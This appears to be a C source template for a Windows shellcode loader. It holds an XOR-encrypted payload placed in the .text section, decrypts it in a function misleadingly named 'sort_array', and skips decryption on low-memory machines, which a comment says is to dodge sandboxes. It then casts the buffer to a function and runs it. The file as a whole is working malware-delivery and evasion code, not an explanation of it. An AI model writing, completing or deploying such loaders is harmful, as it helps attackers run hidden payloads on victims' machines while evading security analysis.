#include <windows.h>
#include <stdio.h>

// shellcode array in the .text section with -Wl, --omagic to avoid the VirtualProtect call
__attribute__((section(".text")))
static unsigned char bytecode[SET_BYTECODE_SIZE] = SET_BYTECODE_ARRAY;
static const int bytecode_size = SET_BYTECODE_SIZE;
    
// xor key array
static unsigned char key[SET_KEY_SIZE] = SET_KEY_ARRAY;
static const int key_size = SET_KEY_SIZE;

void sort_array()
{
    for(int i=0;i<bytecode_size;i++)
    {
        bytecode[i] = bytecode[i] ^ key[i % 16];
    }
}

void hello_world()
{
    printf("Hello World !\n");
}

void check_available_ressources()
{
    MEMORYSTATUSEX memorystatus; // will store the data about the memory
    memorystatus.dwLength = sizeof(memorystatus); // properly initializing the structure
    
    // reading the memory 
    GlobalMemoryStatusEx(&memorystatus);

    if((memorystatus.ullTotalPhys / 1000000000) < 5) // less than 4go is considered to be a potato or a sandbox, we don't want either of them to run our payload
        hello_world();
    else
        sort_array();

}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
{
    // DWORD dummy; // dummy but real dword pointer for the VirtualProtect call

    check_available_ressources();

    // VirtualProtect(bytecode, bytecode_size,
    //         PAGE_EXECUTE_READWRITE, &dummy);

    // cast the array to a function
    void (*function)(void) = (void (*)(void))bytecode;

    // calling the function
    function();
    return 0;
}